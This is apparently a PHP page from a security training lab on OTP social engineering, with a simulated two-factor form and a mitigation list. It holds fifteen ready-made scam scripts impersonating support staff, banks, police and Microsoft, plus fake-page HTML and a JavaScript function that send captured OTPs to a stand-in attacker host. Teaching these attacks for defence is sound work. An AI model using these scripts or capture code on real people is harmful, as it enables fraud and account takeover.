<?php
// Lab 4: OTP Social Engineering
// Vulnerability: OTP social engineering attacks

session_start();

$message = '';
$otp_sent = false;
$otp_verified = false;
$social_engineering_attempts = $_SESSION['se_attempts'] ?? 0;

// Simulate OTP generation and verification
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'send_otp') {
        $phone = $_POST['phone'] ?? '';
        $email = $_POST['email'] ?? '';
        
        if (!empty($phone) || !empty($email)) {
            // Generate a simple 6-digit OTP
            $otp = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
            $_SESSION['otp'] = $otp;
            $_SESSION['otp_time'] = time();
            $_SESSION['phone'] = $phone;
            $_SESSION['email'] = $email;
            $otp_sent = true;
            $message = '<div class="alert alert-success">✅ OTP sent successfully! Check your phone/email.</div>';
        } else {
            $message = '<div class="alert alert-danger">❌ Please provide phone number or email.</div>';
        }
    } elseif ($action === 'verify_otp') {
        $entered_otp = $_POST['otp'] ?? '';
        $stored_otp = $_SESSION['otp'] ?? '';
        
        if (!empty($entered_otp) && !empty($stored_otp)) {
            // Check if OTP is expired (5 minutes)
            if (time() - $_SESSION['otp_time'] > 300) {
                $message = '<div class="alert alert-danger">❌ OTP has expired. Please request a new one.</div>';
            } elseif ($entered_otp === $stored_otp) {
                $otp_verified = true;
                $message = '<div class="alert alert-success">✅ OTP verified successfully! Access granted.</div>';
            } else {
                $message = '<div class="alert alert-danger">❌ Invalid OTP. Please try again.</div>';
            }
        } else {
            $message = '<div class="alert alert-danger">❌ Please enter the OTP.</div>';
        }
    } elseif ($action === 'social_engineering') {
        $se_type = $_POST['se_type'] ?? '';
        $se_message = $_POST['se_message'] ?? '';
        
        if (!empty($se_type) && !empty($se_message)) {
            $_SESSION['se_attempts'] = $social_engineering_attempts + 1;
            $message = '<div class="alert alert-warning">⚠️ Social engineering attempt detected: ' . htmlspecialchars($se_type) . ' - ' . htmlspecialchars($se_message) . '</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 4: OTP Social Engineering - OTP Bypass Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .result-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .se-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .otp-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .otp-code {
            font-family: 'Courier New', monospace;
            font-size: 2rem;
            font-weight: bold;
            color: var(--accent-green);
            text-align: center;
            letter-spacing: 0.5rem;
        }

        .se-techniques {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .technique-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
        }

        .technique-title {
            color: var(--accent-green);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .technique-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .se-simulator {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .se-attempts {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-red);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to OTP Bypass Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 4: OTP Social Engineering</h1>
            <p class="hero-subtitle">OTP social engineering attacks</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates OTP social engineering vulnerabilities where attackers manipulate users into revealing their OTP codes through psychological manipulation, fake support calls, and phishing techniques.</p>
            <p><strong>Objective:</strong> Understand how OTP social engineering attacks work and how to exploit them.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable OTP System
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>Two-Factor Authentication</h5>
                            <p>This system uses OTP for two-factor authentication. Try to exploit social engineering:</p>
                            
                            <?php if (!$otp_sent): ?>
                            <form method="POST">
                                <input type="hidden" name="action" value="send_otp">
                                <div class="mb-3">
                                    <label for="phone" class="form-label">Phone Number</label>
                                    <input type="tel" class="form-control" id="phone" name="phone" placeholder="+1234567890">
                                </div>
                                <div class="mb-3">
                                    <label for="email" class="form-label">Email Address</label>
                                    <input type="email" class="form-control" id="email" name="email" placeholder="user@example.com">
                                </div>
                                <button type="submit" class="btn btn-primary">Send OTP</button>
                            </form>
                            <?php else: ?>
                            <form method="POST">
                                <input type="hidden" name="action" value="verify_otp">
                                <div class="mb-3">
                                    <label for="otp" class="form-label">Enter OTP</label>
                                    <input type="text" class="form-control" id="otp" name="otp" placeholder="123456" maxlength="6">
                                </div>
                                <button type="submit" class="btn btn-primary">Verify OTP</button>
                            </form>
                            <?php endif; ?>
                            
                            <?php echo $message; ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-person-check me-2"></i>Social Engineering Simulator
                    </div>
                    <div class="card-body">
                        <div class="se-simulator">
                            <h5>Social Engineering Attack Simulator</h5>
                            <p>Simulate social engineering attacks to bypass OTP:</p>
                            
                            <form method="POST">
                                <input type="hidden" name="action" value="social_engineering">
                                <div class="mb-3">
                                    <label for="se_type" class="form-label">Attack Type</label>
                                    <select class="form-select" id="se_type" name="se_type">
                                        <option value="">Select attack type</option>
                                        <option value="fake_support">Fake Support Call</option>
                                        <option value="phishing_email">Phishing Email</option>
                                        <option value="fake_website">Fake Website</option>
                                        <option value="urgency_tactic">Urgency Tactic</option>
                                        <option value="authority_impersonation">Authority Impersonation</option>
                                        <option value="technical_issue">Technical Issue</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label for="se_message" class="form-label">Attack Message</label>
                                    <textarea class="form-control" id="se_message" name="se_message" rows="3" placeholder="Enter your social engineering message..."></textarea>
                                </div>
                                <button type="submit" class="btn btn-primary">Simulate Attack</button>
                            </form>
                        </div>
                        
                        <div class="se-attempts">
                            <h5>Social Engineering Attempts:</h5>
                            <p>Total attempts: <?php echo $social_engineering_attempts; ?></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($otp_sent && !$otp_verified): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>OTP Display (For Testing)
                    </div>
                    <div class="card-body">
                        <div class="otp-display">
                            <h5>Generated OTP (For Testing Only):</h5>
                            <div class="otp-code"><?php echo $_SESSION['otp'] ?? 'N/A'; ?></div>
                            <small class="text-muted">This OTP is displayed for testing purposes only. In real-world scenarios, this would be sent via SMS/email.</small>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Social Engineering Techniques
                    </div>
                    <div class="card-body">
                        <div class="se-techniques">
                            <div class="technique-card">
                                <div class="technique-title">Fake Support Call</div>
                                <div class="technique-demo">"Hi, this is IT support. We're experiencing a security issue with your account. Can you please share the OTP you just received so we can verify your identity and fix the problem?"</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Phishing Email</div>
                                <div class="technique-demo">"URGENT: Your account has been compromised. Please click this link and enter your OTP to secure your account immediately. Failure to do so will result in account suspension."</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Fake Website</div>
                                <div class="technique-demo">Create a fake login page that looks identical to the real one. When user enters OTP, capture it and use it on the real site.</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Urgency Tactic</div>
                                <div class="technique-demo">"Your account will be permanently deleted in 5 minutes if you don't verify your identity with the OTP you just received. Please share it immediately!"</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Authority Impersonation</div>
                                <div class="technique-demo">"This is the security team. We've detected suspicious activity on your account. Please provide the OTP to confirm your identity and prevent account lockout."</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Technical Issue</div>
                                <div class="technique-demo">"We're experiencing technical difficulties with our OTP system. Please share the OTP you received so we can manually verify your account and resolve the issue."</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> OTP Social Engineering</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> Psychological manipulation</li>
                        <li><strong>Issue:</strong> Human vulnerability</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Fake Support:</strong> Impersonate support staff</li>
                        <li><strong>Phishing:</strong> Send fake emails</li>
                        <li><strong>Fake Websites:</strong> Create fake login pages</li>
                        <li><strong>Urgency Tactics:</strong> Create false urgency</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>OTP Social Engineering Examples</h5>
            <p>Use these techniques to exploit OTP social engineering vulnerabilities:</p>
            
            <h6>1. Fake Support Call Script:</h6>
            <div class="code-block">"Hello, this is John from the IT security team. We've detected unusual activity on your account and need to verify your identity immediately. Can you please share the 6-digit OTP code you just received? This is urgent and your account may be compromised if we don't act quickly."</div>

            <h6>2. Phishing Email Template:</h6>
            <div class="code-block">Subject: URGENT: Security Alert - Account Verification Required

Dear Valued Customer,

We have detected suspicious activity on your account. To prevent unauthorized access, please verify your identity by entering the OTP code you just received.

Click here to verify: http://fake-verification-site.com

If you don't verify within 10 minutes, your account will be suspended.

Best regards,
Security Team</div>

            <h6>3. Fake Website HTML:</h6>
            <div class="code-block"><!DOCTYPE html>
<html>
<head>
    <title>Account Verification - Security Alert</title>
    <style>
        /* Copy exact styling from real site */
        body { font-family: Arial, sans-serif; }
        .container { max-width: 400px; margin: 0 auto; }
        .alert { background: #ff4444; color: white; padding: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="alert">URGENT: Verify your account immediately</div>
        <h2>Enter OTP Code</h2>
        <form action="http://attacker-site.com/capture" method="POST">
            <input type="text" name="otp" placeholder="Enter 6-digit OTP" maxlength="6">
            <button type="submit">Verify Account</button>
        </form>
    </div>
</body>
</html></div>

            <h6>4. SMS Phishing Template:</h6>
            <div class="code-block">URGENT: Your account has been compromised. Enter the OTP code you just received at http://verify-account-now.com to secure your account. Do not ignore this message.</div>

            <h6>5. Voice Call Script:</h6>
            <div class="code-block">"Hi, this is Sarah from customer support. We're calling because there's been a security breach and we need to verify your account immediately. Can you please read out the OTP code you just received? This is for your own security and we need to act fast before your account is compromised."</div>

            <h6>6. Social Media Message:</h6>
            <div class="code-block">"Hey! I work at [Company] and we're having a security issue. Can you help me by sharing the OTP you just got? It's urgent and I need to verify your account before it gets locked. Thanks!"</div>

            <h6>7. WhatsApp Message:</h6>
            <div class="code-block">"URGENT: Your account security has been compromised. Please share the OTP code you just received so we can verify your identity and prevent unauthorized access. This is time-sensitive."</div>

            <h6>8. LinkedIn Message:</h6>
            <div class="code-block">"Hi [Name], I'm from the security team at [Company]. We've detected suspicious activity on your account and need to verify your identity immediately. Can you please share the OTP code you just received? This is urgent and your account may be at risk."</div>

            <h6>9. Fake Mobile App:</h6>
            <div class="code-block">// Create fake mobile app that looks like the real one
// When user enters OTP, capture it and send to attacker
// Use the captured OTP on the real application

function captureOTP(otp) {
    // Send OTP to attacker's server
    fetch('http://attacker-site.com/capture', {
        method: 'POST',
        body: JSON.stringify({otp: otp})
    });
    
    // Then redirect to real app
    window.location.href = 'http://real-app.com/verify?otp=' + otp;
}</div>

            <h6>10. Authority Impersonation:</h6>
            <div class="code-block">"This is Detective Johnson from the Cyber Crime Unit. We're investigating a security breach and need to verify your account immediately. Please provide the OTP code you just received. This is a matter of national security and your cooperation is required."</div>

            <h6>11. Technical Support Scam:</h6>
            <div class="code-block">"Hello, this is Microsoft Technical Support. We've detected a virus on your computer that's trying to access your accounts. To protect you, we need to verify your identity with the OTP code you just received. Please share it so we can secure your account."</div>

            <h6>12. Bank Security Alert:</h6>
            <div class="code-block">"This is an automated message from your bank. We've detected suspicious activity on your account. Please call us immediately at 1-800-FAKE-BANK and provide the OTP code you just received to verify your identity and prevent fraud."</div>

            <h6>13. Fake Social Media Post:</h6>
            <div class="code-block">"URGENT: There's a security issue with your account. Please DM us the OTP code you just received so we can verify your identity and fix the problem. This is time-sensitive and your account may be at risk."</div>

            <h6>14. Email Spoofing:</h6>
            <div class="code-block">From: security@your-bank.com
To: victim@email.com
Subject: URGENT: Account Security Alert

Dear Customer,

We have detected unauthorized access attempts on your account. To prevent fraud, please verify your identity by entering the OTP code you just received.

Click here to verify: http://fake-bank-verification.com

If you don't verify within 15 minutes, your account will be locked.

Best regards,
Security Team
Your Bank</div>

            <h6>15. Multi-Channel Attack:</h6>
            <div class="code-block">// Combine multiple techniques
// 1. Send phishing email
// 2. Call victim pretending to be support
// 3. Send SMS with fake link
// 4. Create fake social media account
// 5. Use fake website to capture OTP

// This increases success rate by targeting multiple channels</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Account takeover through social engineering</li>
                <li>Financial fraud and payment manipulation</li>
                <li>Authentication bypass and privilege escalation</li>
                <li>Compliance violations and security breaches</li>
                <li>Cross-site attacks and data exfiltration</li>
                <li>Sophisticated account compromise</li>
                <li>Identity theft and impersonation</li>
                <li>Corporate espionage and data theft</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Educate users about social engineering attacks</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use secure OTP generation and delivery</li>
                    <li>Implement proper rate limiting and throttling</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual authentication patterns</li>
                    <li>Use secure coding practices</li>
                    <li>Implement proper error handling</li>
                    <li>Educate users about OTP security</li>
                    <li>Use multi-factor authentication</li>
                    <li>Implement proper logging and monitoring</li>
                    <li>Use anti-phishing measures</li>
                    <li>Implement proper user training</li>
                    <li>Use security awareness programs</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testSocialEngineering() {
            alert('Social Engineering test initiated. Try the social engineering techniques above.');
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
